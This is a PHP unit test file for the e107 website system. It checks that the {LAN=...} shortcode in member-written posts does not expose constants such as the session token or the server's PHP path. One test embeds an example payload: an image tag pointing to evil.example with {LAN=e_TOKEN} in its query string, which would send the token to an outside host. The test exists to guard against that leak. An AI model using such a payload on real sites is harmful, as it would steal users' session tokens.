<?php
/*
 * e107 website system
 *
 * Copyright (C) 2008-2026 e107 Inc (e107.org)
 * Released under the terms and conditions of the
 * GNU General Public License (http://www.gnu.org/licenses/gpl.txt)
 */

/**
 * {LAN=...} in text a member wrote, which the BODY and DESCRIPTION contexts parse for shortcodes.
 */
class lan_shortcodeTest extends \Test\Unit
{
	/** No CLI request mints an e-token, so the token row renders in a booted subprocess that defines this stand-in. */
	const SESSION_TOKEN = 'e107t0ken0123456789abcdef0123456';

	public function testAnImageDoesNotCarryTheSessionTokenThroughTheLanShortcode()
	{
		list($output, $status) = $this->runInBootedCli("define('e_TOKEN', '".self::SESSION_TOKEN."'); \$tp = e107::getParser(); "
			."echo '@@'.\$tp->toHTML('[img]http://evil.example/p.png?t={LAN=e_TOKEN}[/img]', true, 'BODY').'@@';");

		$printed = implode("\n", $output);
		$matches = array();

		self::assertSame(0, $status, 'The render exited '.$status.":\n".$printed);
		self::assertSame(1, preg_match('/@@(.*)@@/s', $printed, $matches), "The render printed no answer:\n".$printed);
		self::assertStringNotContainsString(self::SESSION_TOKEN, $matches[1], '{LAN=e_TOKEN} printed the token: '.$matches[1]);
	}

	public function testTheLanShortcodeDoesNotPrintAConstantThatIsNotALanguageTerm()
	{
		self::assertNotSame('', PHP_BINARY);

		$html = e107::getParser()->parseTemplate('{LAN=PHP_BINARY}', true);

		self::assertStringNotContainsString(PHP_BINARY, $html, '{LAN=PHP_BINARY} printed the server path: '.$html);
	}

	/**
	 * @return array
	 */
	public function languageTerms()
	{
		return array(
			'LAN_ prefix added'       => array('{LAN=EDIT}', 'LAN_EDIT'),
			'LAN_ name written whole' => array('{LAN=LAN_EDIT}', 'LAN_EDIT'),
			'LAN within the name'     => array('{LAN=SUBNEWSLAN_9}', 'SUBNEWSLAN_9'),
			'numbered legacy term'    => array('{LAN=BLOGCAL_L2}', 'BLOGCAL_L2'),
		);
	}

	/**
	 * @dataProvider languageTerms
	 * @param string $shortcode
	 * @param string $constant
	 */
	public function testTheLanShortcodeStillPrintsALanguageTerm($shortcode, $constant)
	{
		e107::coreLan('submitnews');
		e107::includeLan(e_PLUGIN.'blogcalendar_menu/languages/English.php');

		self::assertSame(constant($constant), e107::getParser()->parseTemplate($shortcode, true));
	}

	public function testTheLanShortcodeIgnoresAListOfParameters()
	{
		self::assertSame('a  b', e107::getParser()->toHTML('a {LAN: x=y} b', true, 'BODY'));
	}
}
